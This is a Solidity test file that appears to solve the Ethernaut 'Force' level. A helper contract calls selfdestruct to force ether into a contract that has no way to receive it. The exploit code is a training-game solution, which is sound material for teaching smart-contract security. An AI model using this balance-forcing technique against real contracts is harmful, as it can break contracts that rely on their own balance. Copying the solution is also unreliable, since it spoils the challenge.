// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Force} from "../levels/Force/Force.sol";
import {ForceFactory} from "../levels/Force/ForceFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract ForceTest is LevelTest {
    Force private level;

    constructor() {
        levelFactory = new ForceFactory();
    }

    function testForce() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Force(levelAddress);
    }

    function exploit() internal override {
        vm.startPrank(player);

        ForceExploit expl = new ForceExploit(level);
        expl.run{value: 1 wei}();

        vm.stopPrank();
    }
}

contract ForceExploit {
    Force private force;

    constructor(Force _force) {
        force = _force;
    }

    function run() public payable {
        address payable target = payable(address(force));
        selfdestruct(target);
    }
}
